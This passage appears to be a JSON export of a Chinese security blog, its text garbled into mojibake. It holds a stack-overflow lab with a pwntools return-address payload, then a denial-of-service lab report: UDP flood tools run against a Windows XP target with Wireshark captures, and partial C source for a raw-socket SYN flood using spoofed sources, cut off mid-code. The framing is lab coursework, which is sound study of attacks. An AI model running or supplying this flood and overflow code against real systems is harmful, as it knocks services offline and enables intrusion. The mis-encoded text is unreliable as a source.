è¿™é‡Œåœ¨IDAé‡Œé¢åˆ†æå‘ç°ï¼Œè¦å¤åˆ¶çš„å­—ç¬¦ä¸²v2çš„ç©ºé—´å¦‚ä¸‹ï¼š\nå æ®0x0cä¸ªå­—ç¬¦ä¹‹åï¼Œä¾¿ä¸ºè¿”å›åœ°å€ï¼Œ å› æ­¤æˆ‘ä»¬ç”¨0x0cä¸ªå­—ç¬¦å°†å…¶è¦†ç›–ï¼Œåœ¨å¡«å……æˆ‘ä»¬éœ€è¦çš„å‡½æ•°åœ°å€0x401060å³å¯è¾¾åˆ°ç›®æ ‡\nåˆ©ç”¨pwntoolsæ˜“å¾—è„šæœ¬å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 from pwn import * ret = 0x00401060 payload = b\u0026#39;a\u0026#39;*0x0c +p32(ret) with open(\u0026#34;stackover.txt\u0026#34;,\u0026#39;wb\u0026#39;) as f: f.write(payload) print(payload) å°†payloadç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥ï¼Œæ‹¿åˆ°shell\n","permalink":"http://www.reus09.top/posts/tech/%E6%A0%88%E6%BA%A2%E5%87%BA/","summary":"æ ˆæº¢å‡ºæŠ¥å‘Š 0x01 ç›®æ ‡ é€šè¿‡å¯¹ç¨‹åºè¾“å…¥çš„å¯†ç çš„é•¿åº¦ã€å†…å®¹ç­‰ä¿®æ”¹ç”¨Ollydbgæ¥éªŒè¯ç¼“å†²åŒºæº¢å‡ºçš„å‘ç”Ÿï¼ˆå‚è€ƒæä¾›çš„ä¸¤ä¸ªä»£ç ï¼‰ å®Œæˆæ·¹æ²¡ç›¸é‚»å˜é‡æ”¹å˜ç¨‹åºæµ","title":"æ ˆæº¢å‡º"},{"content":"æ‹’ç»æœåŠ¡æ”»å‡» 0x01 å®éªŒç›®çš„ ä½¿ç”¨udp floodã€é˜¿æ‹‰ä¸ç­‰å·¥å…·ï¼Œåˆ†ç»„å±•å¼€æ”»å‡»å¹¶åˆ©ç”¨wiresharkåˆ†æã€‚ ç¼–ç¨‹å®ç°SYN Floodæ”»å‡»ã€‚ 0x02 å®éªŒå‰æçŸ¥è¯† DoSï¼ˆDenial of Serviceï¼‰æ”»å‡» å‡¡æ˜¯èƒ½å¯¼è‡´åˆæ³•ç”¨æˆ·ä¸èƒ½æ­£å¸¸è®¿é—®ç½‘ç»œæœåŠ¡çš„è¡Œä¸ºéƒ½å¯è§†ä¸ºæ‹’ç»æœåŠ¡æ”»å‡»ã€‚ DDoSï¼ˆDistributed Denial of Serviceï¼‰æ”»å‡» å€ŸåŠ©æ•°ç™¾ã€æ•°åƒè¢«æ¤å…¥æ”»å‡»å®ˆæŠ¤è¿›ç¨‹çš„ä¸»æœºï¼Œå¯¹ç›®æ ‡å±•å¼€çš„â€œé›†å›¢å¼â€æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œé€šå¸¸é’ˆå¯¹é«˜å¸¦å®½ã€é«˜æ€§èƒ½ç½‘ç«™ DDoSæ”»å‡»ç±»å‹ åŸºäºæ“ä½œç³»ç»Ÿ/åº”ç”¨è½¯ä»¶æ¼æ´çš„DDoSæ”»å‡»ï¼›\nåŸºäºåè®®æ¼æ´çš„ç½‘ç»œå±‚DDoSæ”»å‡»ï¼›\nåˆ©ç”¨åè®®æ¼æ´ï¼Œå¯¼è‡´ç›®æ ‡èµ„æºè¢«å¤§å¹…å ç”¨ã€‚æ˜¯æœ€å¸¸è§çš„æ”»å‡»æ–¹å¼ï¼Œä½†éœ€è¦ä¸€å®šè§„æ¨¡çš„å‚€å„¡ä¸»æœºã€‚ é¢å‘ç½‘ç»œèµ„æºçš„DDoSæ”»å‡»ï¼›\næ”»å‡»è€…æ§åˆ¶å‚€å„¡æœºåŒæ—¶å‘é€æ­£å¸¸æŠ¥æ–‡ï¼Œå¯¼è‡´ç›®æ ‡èµ„æºè¢«è€—å°½ã€‚è¿™ç§æ”»å‡»æ–¹å¼æœ€éš¾é˜²èŒƒï¼Œæ”»å‡»è€…ä¹Ÿéœ€è¦æ§åˆ¶è¾ƒå¤§è§„æ¨¡çš„ä¸»æœºæˆ–æœåŠ¡å™¨ Ping of Death æ”»å‡»ç‚¹ï¼šæ“ä½œç³»ç»Ÿåè®®æ ˆæ²¡æœ‰å¤„ç†ä¾‹å¤–æƒ…å†µçš„è®¾è®¡ç¼ºé™·ã€‚ åŸç†ï¼šåˆ©ç”¨äº†åè®®å®ç°æ—¶çš„æ¼æ´ï¼ˆCVE-1999-0128ï¼‰ã€‚ICMPåè®®ç”¨äºè¯Šæ–­ç½‘ç»œçŠ¶å†µï¼ˆç«¯ç‚¹æ˜¯å¦å¯è¾¾ç­‰ï¼‰ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼ŒAå‘Bå‘é€ICMP echo requestï¼ŒBæ”¶åˆ°åè¿”å›ICMP echo replyã€‚åˆ™AçŸ¥é“ï¼ŒBåœ¨çº¿ã€å¯è¾¾ã€‚ICMPåŒ…é™¤äº†åŒ…å¤´å¤–ï¼Œè¿˜å¯ä»¥æºå¸¦æ•°æ®ã€‚è¿™äº›æ•°æ®ä¸ç”¨äºè¿›ä¸€æ­¥å¤„ç†ï¼Œä»…è¾…åŠ©è¯Šæ–­ç½‘ç»œçŠ¶å†µï¼ˆæ ¹æ®æ”¶åˆ°å“åº”çš„æ—¶é—´åˆ¤æ–­ç½‘ç»œæ˜¯å¦é€šç•…ï¼‰ã€‚æ”»å‡»è€…åˆ¶é€ è¶…é•¿æ•°æ®åŒ…ï¼Œä½¿å¾—æ•°æ®åŒ…è¶…è¿‡65535å­—èŠ‚ä¸Šé™ã€‚æ²¡æœ‰å¼‚å¸¸å¤„ç†çš„åè®®æ ˆï¼Œæ”¶åˆ°è¿™æ ·çš„æ•°æ®åŒ…ï¼Œå¯èƒ½ä¼šç”±äºç¼“å­˜åŒºæº¢å‡ºè€Œå´©æºƒã€‚ï¼ˆIPæ•°æ®åŒ…çš„æœ€å¤§é•¿åº¦ä¸º65535Bï¼ŒIPé¦–éƒ¨é•¿åº¦ä¸º20Bï¼ŒICMPé¦–éƒ¨ä¸º8å­—èŠ‚ï¼ŒICMPåŒ…æœ€å¤§æ•°æ®é•¿åº¦ä¸ºï¼š65535-20-8=65507B. Smurf ä»¥ç›®æ ‡IPä¸ºæºåœ°å€ï¼Œä»¥å¹¿æ’­åœ°å€ä¸ºç›®åœ°å€ï¼Œå‘é€ICMP Echoè¯·æ±‚ã€‚å¹¿æ’­åœ°å€å¯¹åº”ç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºéƒ½èƒ½æ”¶åˆ°è¯·æ±‚ï¼Œå¹¶å‘ç›®æ ‡å‘é€ICMP Replyï¼Œå¯¼è‡´ç›®æ ‡è¢«å¤§é‡åº”ç­”å æ®èµ„æºã€‚ UdpSmurf åˆ©ç”¨7å·(echo)ç«¯å£ã€‚æ ¹æ®åè®®ï¼Œè‹¥ç«¯å£å¼€æ”¾ï¼Œåˆ™å›é€åº”ç­”UDPæ•°æ®åŒ…ã€‚è‹¥ç«¯å£å…³é—­ï¼Œåˆ™å‘é€ä¸€ä¸ªICMPæŠ¥æ–‡ï¼ˆç›®æ ‡ä¸å¯è¾¾ï¼‰ã€‚ æ”»å‡»è€…ä»¥å¹¿æ’­åœ°å€ä¸ºç›®æ ‡åœ°å€ï¼Œä»¥å—å®³è€…åœ°å€ä¸ºæºåœ°å€ï¼Œä½¿å¾—å¤§é‡åº”ç­”åŒ…é€å¾€å—å®³è€…ã€‚ TCP SYN Floodæ”»å‡» é€šè¿‡è™šå‡çš„æ•°æ®åŒ…ï¼Œé€ æˆç›®æ ‡ä¿å­˜å¤§é‡åŠå¼€TCPè¿æ¥ã€‚ ç®¡ç†TCPè¿æ¥éœ€è¦ç³»ç»Ÿèµ„æºï¼Œç³»ç»Ÿèƒ½å¿å—çš„åŠå¼€è¿æ¥æœ‰ä¸Šé™ã€‚ å½“åŠå¼€è¿æ¥è¾¾åˆ°ä¸€å®šæ•°ç›®æ—¶ï¼Œç³»ç»Ÿå°†ä¸å†æ¥æ”¶æ–°çš„è¿æ¥è¯·æ±‚ã€‚ æ­£å¸¸çš„æœåŠ¡è¯·æ±‚å› æ­¤å¾—ä¸åˆ°å“åº”ã€‚ TCPæ­£å¸¸è¿æ¥è¿‡ç¨‹ Aå‘é€SYNåŒ…åæ­»æœºæˆ–æ‰çº¿ TCPåè®®å¤´\nTCPä¼ªé¦–éƒ¨\nä¼ªé¦–éƒ¨å…±æœ‰ 12 å­—èŠ‚ï¼ŒåŒ…å« IP åè®®å¤´éƒ¨çš„ä¸€äº›å­—æ®µï¼Œæœ‰å¦‚ä¸‹ä¿¡æ¯ï¼š32ä½æºIPåœ°å€ã€32ä½ç›®çš„IPåœ°å€ã€8ä½ä¿ç•™å­—èŠ‚(ç½®0)ã€8ä½ä¼ è¾“å±‚åè®®å·(TCPæ˜¯6ï¼ŒUDPæ˜¯17)ã€16ä½TCPæŠ¥æ–‡é•¿åº¦(TCPé¦–éƒ¨+æ•°æ®)ã€‚ TCP åè®®æ ¡éªŒå’Œè®¡ç®—ä¸‰éƒ¨åˆ†ï¼šTCPä¼ªé¦–éƒ¨ + TCPå¤´éƒ¨ + TCPæ•°æ®ã€‚ IP å¤´éƒ¨\nTCP åè®®é€šè¿‡ä¸€ç§åä¸º ä¸‰æ¬¡æ¡æ‰‹ çš„è¿‡ç¨‹æ¥å»ºç«‹å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„è¿æ¥ï¼Œä¸‰æ¬¡æ¡æ‰‹ è¿‡ç¨‹çš„åŸç†å¦‚å›¾\nå»ºç«‹è¿æ¥ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹å¦‚ä¸‹ï¼š\nå®¢æˆ·ç«¯éœ€è¦å‘é€ä¸€ä¸ª SYNåŒ… ç»™æœåŠ¡ç«¯ï¼ˆåŒ…å«äº†å®¢æˆ·ç«¯åˆå§‹åŒ–åºåˆ—å·ï¼‰ï¼Œå¹¶ä¸”å°†è¿æ¥çš„çŠ¶æ€è®¾ç½®ä¸º SYN_SENTï¼Œè¿™ä¸ªè¿‡ç¨‹ç”± connect() ç³»ç»Ÿè°ƒç”¨å®Œæˆã€‚\næœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ SYNåŒ… åï¼Œå›å¤ä¸€ä¸ª SYN+ACKåŒ… ç»™å®¢æˆ·ç«¯ï¼ˆåŒ…å«äº†æœåŠ¡ç«¯åˆå§‹åŒ–åºåˆ—å·ï¼‰ï¼Œå¹¶ä¸”è®¾ç½®è¿æ¥çš„çŠ¶æ€ä¸º SYN_RCVDã€‚\nå®¢æˆ·ç«¯æ¥æ”¶åˆ°æœåŠ¡ç«¯å‘é€è¿‡æ¥çš„ SYN+ACKåŒ… åï¼Œè®¾ç½®è¿æ¥çŠ¶æ€ä¸º ESTABLISHEDï¼ˆè¡¨ç¤ºè¿æ¥å·²ç»å»ºç«‹ï¼‰ï¼Œå¹¶ä¸”å›å¤ä¸€ä¸ª ACKåŒ… ç»™æœåŠ¡ç«¯ã€‚\næœåŠ¡ç«¯æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ ACKåŒ… åï¼Œå°†è¿æ¥çŠ¶æ€è®¾ç½®ä¸º ESTABLISHEDï¼ˆè¡¨ç¤ºè¿æ¥å·²ç»å»ºç«‹ï¼‰ã€‚\nå½“ ä¸‰æ¬¡æ¡æ‰‹ è¿‡ç¨‹å®Œæˆåï¼Œä¸€ä¸ª TCP è¿æ¥å°±æ­¤å»ºç«‹å®Œæˆã€‚\nSYN-floodæ”»å‡»å¤§æ¦‚æœ‰ä»¥ä¸‹ä¸‰ç§æ”»å‡»æ–¹å¼ï¼š\nDirect Attack æ”»å‡»æ–¹ä½¿ç”¨å›ºå®šçš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•å¯¹æ”»å‡»æ–¹çš„æ¶ˆè€—æœ€å°ã€‚ Spoofing(æ¬ºéª—) Attack æ”»å‡»æ–¹ä½¿ç”¨å˜åŒ–çš„æºåœ°å€å‘èµ·æ”»å‡»ï¼Œè¿™ç§æ–¹æ³•éœ€è¦æ”»å‡»æ–¹ä¸åœåœ°ä¿®æ”¹æºåœ°å€ï¼Œå®é™…ä¸Šæ¶ˆè€—ä¹Ÿä¸å¤§ã€‚ Distributed Direct Attack è¿™ç§æ”»å‡»ä¸»è¦æ˜¯ä½¿ç”¨åƒµå°¸ç½‘ç»œè¿›è¡Œå›ºå®šæºåœ°å€çš„æ”»å‡» 0x03 å®éªŒç¯å¢ƒ éƒ¨ç½²äºåŒä¸€å±€åŸŸç½‘ä¸‹ æ”»å‡»æœº ç½‘ç»œå®‰å…¨å®éªŒ Windows xp IP:192.168.195.131 MAC :00-0C-29-06-65-C9 é¶æœº æ±‡ç¼– Windows xp IP:192.168.195.135 MAC : 00-0c-29-19-ba-6e ç¨‹åºè¿è¡Œæœºå™¨ Ubuntu 16 ç½‘å…³ IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 å·¥å…·ï¼š udp-Flood é˜¿æ‹‰ä¸ visual studio code wireshark 0x04 å·¥å…·åˆ†æ udp_Flood é¦–å…ˆçœ‹ä¸€ä¸‹é¶æœºIP:192.168.195.135å¼€æ”¾çš„ç«¯å£\nå‘ç°TCPä¸­21ã€22ã€80ç«¯å£å‡å¼€å¯ï¼ŒUDPå¼€å¯445,500ç«¯å£ é¦–å…ˆåœ¨æ”»å‡»æœºæ‰“å¼€udp_floodå·¥å…·ï¼Œå¯¹80ç«¯å£è¿›è¡Œæ”»å‡»ã€‚\næ¯ç§’å‘11ä¸ªåŒ… ç„¶ååœ¨é¶æœºä¸­æ‰“å¼€Wiresharkè¿›è¡ŒæŠ“åŒ…\nå®¹æ˜“å‘ç°ï¼Œæ”»å‡»æœºå‘é¶æœºæ¯å‘ä¸€ä¸ªUDPåŒ…ï¼Œé¶æœºå°±ä¼šå›åº”ä¸€ä¸ªICMPåŒ…\nä¸éš¾å‘ç°ï¼ŒudpåŒ…çš„æ•°æ®æµéƒ½æ²¡æœ‰é—®é¢˜ï¼Œæ‰€æœ‰udpåŒ…çš„å¤§å°ç›¸åŒï¼Œåè®®ç›¸åŒï¼ŒçŸ­æ—¶é—´å‘é€å¤§é‡çš„åŒ…\nä½†æ˜¯æœåŠ¡å™¨å›æ˜¾ICMPæ˜¾ç¤ºPort Unreachable\nè¿™æ˜¯å› ä¸ºæœåŠ¡å™¨å“åº”å‘é€åˆ°å…¶ä¸­ä¸€ä¸ªç«¯å£çš„UDPæ•°æ®åŒ…æ‰€é‡‡å–çš„æ­¥éª¤ã€‚åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œå½“æœåŠ¡å™¨åœ¨ç‰¹å®šç«¯å£æ¥æ”¶åˆ°UDPæ•°æ®åŒ…æ—¶ï¼Œä¼šç»è¿‡ä¸¤ä¸ªæ­¥éª¤ï¼š\næœåŠ¡å™¨é¦–å…ˆæ£€æŸ¥æ˜¯å¦æ­£åœ¨è¿è¡Œæ­£åœ¨ä¾¦å¬æŒ‡å®šç«¯å£çš„è¯·æ±‚çš„ç¨‹åºã€‚ å¦‚æœæ²¡æœ‰ç¨‹åºåœ¨è¯¥ç«¯å£æ¥æ”¶æ•°æ®åŒ…ï¼Œåˆ™æœåŠ¡å™¨ä½¿ç”¨ICMPï¼ˆpingï¼‰æ•°æ®åŒ…è¿›è¡Œå“åº”ï¼Œä»¥é€šçŸ¥å‘é€æ–¹ç›®çš„åœ°ä¸å¯è¾¾ã€‚ 80ç«¯å£å¹¶æ²¡æœ‰UDPè¿›è¡Œç›‘å¬ï¼Œå› æ­¤æœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªICMPåŒ…ï¼Œå‘Šè¯‰å‘é€æ–¹ä¸å¯åˆ°è¾¾ã€‚\nè¿™é‡Œåˆ©ç”¨UDPå¼€å§‹ç›‘å¬çš„445ç«¯å£è¿›è¡Œå®éªŒ\nudpå‘é€çš„åŒ…åŒæ ·æ²¡æœ‰é—®é¢˜ï¼Œå¤§å°ç›¸åŒï¼Œå‡ä¸º83ã€‚ è¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹udp_floodæ”»å‡»ä¹‹å‰çš„æ—¶é—´\nç„¶åæ‰“å¼€udp_floodï¼Œæ”»å‡»80ç«¯å£ å¯ä»¥çœ‹åˆ°é˜¿æ‹‰ä¸udp_floodæ”»å‡»ä¹‹åï¼Œè®¿é—®ç™¾åº¦ä¼šä¸¢åŒ…ï¼Œç„¶åå¹³å‡æ—¶é—´ä¹Ÿå¢åŠ äº† å› æ­¤ï¼Œudp_floodä¸€å®šç¨‹åº¦ä¸Šä¼šé˜»ç¢æœåŠ¡å™¨çš„è®¿é—®é€Ÿåº¦ã€‚ å› æ­¤ï¼Œåœ¨udp_floodæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯å‘é€å¤§é‡ä¼ªé€ æºIPåœ°å€çš„å°udpåŒ…ã€‚ç”±äºUDPåè®®æ˜¯æ— è¿æ¥æ€§çš„ï¼Œæ‰€ä»¥åªè¦å¼€äº†ä¸€ä¸ªUDPçš„ç«¯å£æä¾›ç›¸å…³æœåŠ¡çš„è¯ï¼Œé‚£ä¹ˆå°±å¯é’ˆå¯¹ç›¸å…³çš„æœåŠ¡è¿›è¡Œæ”»å‡»ã€‚è¿™ç§æ”»å‡»æ–¹å¼æ¶ˆè€—çš„æ˜¯æ”»å‡»è€…ä¸é¶æœºæ–¹ä¸¤æ–¹èµ„æºçš„æ¯”æ‹¼ã€‚\né˜¿æ‹‰ä¸ é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹é¶æœºå¼€æ”¾çš„ç«¯å£ åœ¨æ”»å‡»æœºä¸­æ‰“å¼€é˜¿æ‹‰ä¸udpæ´ªæ°´æ”»å‡»å™¨ é¦–å…ˆå·¥å…·é¶æœºçš„80ç«¯å£ ä¾¿äºæµ‹è¯•ï¼Œè¿™é‡Œè¿›è¡Œä¸€èˆ¬udpæ”»å‡» åœ¨é¶æœºä¸­è·Ÿæ®Wiresharkè¿›è¡ŒæŠ“åŒ… åˆ†æä¸€ä¸‹udpæ•°æ®åŒ… å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°udpæ•°æ®åŒ…çš„æºIPã€MACå’Œç›®çš„IPã€MACéƒ½æ˜¯æ­£ç¡®çš„ï¼Œå”¯ä¸€å¼‚å¸¸çš„æ˜¯udpä¼ é€çš„æ•°æ®åŒ…Dataçš„æ•°æ®è¿‡é•¿ï¼Œä¸º3000byte, åŒæ—¶udpå› ä¸ºè¶…è¿‡1500ä¼šåˆ†ç‰‡ä¼ è¾“ï¼Œå¤§å¤§æé«˜äº†æ”»å‡»çš„æ•ˆç‡ã€‚ å°†ç«¯å£æ”¹ä¸º445 åˆ†æä¸€ä¸‹udpçš„ç»“æ„ å‘ç°ä¹Ÿå®Œå…¨ç¬¦åˆé¢„æœŸï¼Œå’Œudp_floodç›¸æ¯”ï¼Œåªæ˜¯åŒ…çš„å¤§å°å˜å¤§äº†ï¼ŒDDOSçš„å¨åŠ›ä¹Ÿæ›´å¼ºå¤§äº†ã€‚ è¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹å·¥å…·å‰ ping www.baidu.comçš„æ—¶å»¶ æ”»å‡»é¶æœºçš„80ç«¯å£ å¾ˆæ˜æ˜¾çœ‹åˆ°æ”»å‡»åçš„udpæ”»å‡»ä½¿å¾—æœåŠ¡å™¨çš„æœ€é«˜æ—¶å»¶å¢åŠ ã€‚ å› æ­¤ï¼Œudp_floodä¸€å®šç¨‹åº¦ä¸Šä¼šé˜»ç¢æœåŠ¡å™¨çš„è®¿é—®é€Ÿåº¦ã€‚ ç”±æ­¤å¯ä»¥çŸ¥é“ï¼Œudp_floodå·¥å…·å’Œé˜¿æ‹‰ä¸çš„åŸç†ç›¸åŒï¼Œéƒ½æ˜¯åˆ©ç”¨UDPæ´ªæ°´æ”»å‡»ï¼Œå¤§æ‰¹é‡çš„æ¶ˆè€—èµ„æºæ¥è¿›è¡ŒDDOSæ”»å‡»ã€‚ æ”»å‡»æ•ˆæœçš„è¯ï¼Œå¦‚æœå¸¦å®½ã€æµé‡è¶³å¤Ÿå¤§çš„è¯ï¼ŒæœåŠ¡å™¨çš„ä¼šä¸æ–­çš„æ¥å—åŒ…ã€ç„¶åç˜«ç—ªã€æ— æ³•æ­£å¸¸ä¸Šç½‘ã€‚ 0x05 SYN-Flood ç¼–ç¨‹å®ç° è¿™é‡Œç”¨å¥—æ¥å­—socketçš„æ–¹æ³•æ¥å®ç°syn-floodæ”»å‡»\nåªéœ€è¦æ„é€ å¥½ä¸€ä¸ªTCPåŒ…ï¼ŒæŒ‡å®šå¥½åŒ…ä¸­IP.flags=0x02(ä¸ºSYNåŒ…)ã€‚\næˆ‘ä»¬è¿™é‡Œåœ¨ubuntu 16 çš„ç¯å¢ƒä¸­ç¼–è¯‘æˆ‘ä»¬å†™å¥½çš„ç¨‹åº\né¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹é¶æœº(IP : 192.168.195.135)çš„å¼€æ”¾ç«¯å£\nå‘ç°å¼€å¯äº†21ã€22ã€80ç«¯å£ åœ¨ç¨‹åºä¸­ï¼Œå¯¹192.168.195.135çš„80ç«¯å£è¿›è¡Œæ”»å‡»\nå› ä¸ºç¨‹åºæ˜¯æ— é™å¾ªç¯å‘é€ï¼Œéœ€è¦æ‰‹åŠ¨ç»ˆæ­¢ ä¸æ­¤åŒæ—¶ï¼Œåˆ©ç”¨Wiresharkåœ¨é¶æœºè¿›è¡ŒæŠ“åŒ…\nå¯ä»¥çœ‹åˆ°ç¨‹åºéšæœºäº§ç”Ÿå¤§é‡çš„è™šå‡åœ°å€å’Œè™šå‡çš„ç«¯å£å¯¹é¶æœºçš„80ç«¯å£è¿›è¡Œè®¿é—®ï¼Œå› ä¸ºåœ°å€å’Œç«¯å£éƒ½ä¸ºè™šå‡çš„ï¼Œæ‰€ä»¥å¤§é‡çš„tcpè¿æ¥é¶æœºæ— æ³•å¯¹å…¶ackå›å¤ã€‚ äº§ç”Ÿå¤§é‡çš„synåŠè¿æ¥ï¼Œå¯¼è‡´æœåŠ¡å™¨è½½è·è¿‡å¤§ï¼Œä»è€Œå´©æºƒã€‚\næŸ¥çœ‹æ­¤æ—¶çš„synçŠ¶æ€ã€‚ å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹åˆ°ï¼Œç¨‹åºäº§ç”Ÿäº†å¤§é‡çš„synåŠè¿æ¥ï¼Œæ¥è‡ªä¸åŒçš„è™šå‡ipåœ°å€å’Œç«¯å£ æŸ¥çœ‹æ”»å‡»å‰ ping www.baidu.com çš„æ•ˆæœ\næ”»å‡»å…¶21ç«¯å£ å‘ç°ping www.baidu.com å·²ç»ä¸èƒ½Pingé€š åŒæ—¶å¾ˆæ˜æ˜¾çš„æ„Ÿå—åˆ°Windows xpå› ä¸ºå—åˆ°SYNæ”»å‡»ï¼Œå› æ­¤è¿è¡Œä¸æµç•…ï¼Œå¡é¡¿ç›¸å½“ä¸¥é‡ã€‚\nå®é™…ä¸Šï¼ŒSYN-floodæ”»å‡»å°±æ˜¯ æ„é€ å¤§é‡çš„SYNåŒ…ã€é‡Œé¢å¡«å……è™šå‡çš„IPã€MACåœ°å€ï¼Œæ¥é€ æˆæœåŠ¡å™¨äº§ç”Ÿå¤§é‡çš„åŠè¿æ¥ï¼Œä»è€Œé€ æˆæœåŠ¡å™¨è¿è¡Œç˜«ç—ªã€‚\nå®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; // ip æŠ¥å¤´ struct iphdr { unsigned char ver_and_hdrlen;// ç‰ˆæœ¬å·ä¸IPå¤´éƒ¨é•¿åº¦ unsigned char tos; // æœåŠ¡ç±»å‹ unsigned short total_len; // æ€»é•¿åº¦ unsigned short id; // IPåŒ…ID unsigned short flags; // æ ‡å¿—ä½(åŒ…æ‹¬åˆ†ç‰‡åç§»é‡) unsigned char ttl; // ç”Ÿå‘½å‘¨æœŸ unsigned char protocol; // ä¸Šå±‚åè®® unsigned short checksum; // æ ¡éªŒå’Œ unsigned int srcaddr; // æºIPåœ°å€ unsigned int dstaddr; // ç›®æ ‡IPåœ°å€ }; // tcp æŠ¥å¤´ struct tcphdr { unsigned short sport; // æºç«¯å£ unsigned short dport; // ç›®æ ‡ç«¯å£ unsigned int seq; // åºåˆ—å· unsigned int ack_seq; // ç¡®è®¤å· unsigned char len; // é¦–éƒ¨é•¿åº¦ unsigned char flag; // æ ‡å¿—ä½ unsigned short win; // çª—å£å¤§å° unsigned short checksum; // æ ¡éªŒå’Œ unsigned short urg; // ç´§æ€¥æŒ‡é’ˆ }; //TCPçš„ä¼ªæŠ¥å¤´ï¼Œåœ¨è®¡ç®—TCPçš„æ ¡éªŒå’Œæ—¶éœ€è¦åŒ…å« struct pseudohdr { unsigned int saddr; //æºç›®çš„IP unsigned int daddr; // ç›®çš„IP char zeros; // 8ä½ä¿ç•™å­—ç¬¦ ä¸€èˆ¬ç½®0 char protocol;// åè®® unsigned short length; // é•¿åº¦ }; // è¿™ä¸ªæ˜¯è®¡ç®—æ ¡éªŒå’Œçš„å‡½æ•° unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } // é€šè¿‡ä¼ å…¥çš„æº IP åœ°å€å’Œç›®æ ‡ IP åœ°å€åˆå§‹åŒ– IP å¤´éƒ¨ç»“æ„ã€‚ void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // æºIPåœ°å€ ip-\u0026gt;dstaddr = dstaddr; // ç›®æ ‡IPåœ°å€ } // åˆå§‹åŒ– tcp åŒ… void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // éšæœºç”Ÿæˆä¸€ä¸ªç«¯å£ tcp-\u0026gt;dport = htons(dport); // ç›®æ ‡ç«¯å£ tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // éšæœºç”Ÿæˆä¸€ä¸ªåˆå§‹åŒ–åºåˆ—å· tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; // 0x02 ä»£è¡¨ æ˜¯syn åŒ…ï¼Œtcpä¸‰æ¬¡è¿æ¥è¯·æ±‚çš„å¼€å§‹ tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } // åˆå§‹åŒ– tcp ä¼ªæŠ¥å¤´ void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } // é€šè¿‡ ç›®æ ‡IPåœ°å€ å’Œ ç›®æ ‡ç«¯å£ ç”Ÿæˆä¸€ä¸ª SYNåŒ…ï¼Œä¿å­˜åˆ°å‚æ•° packet 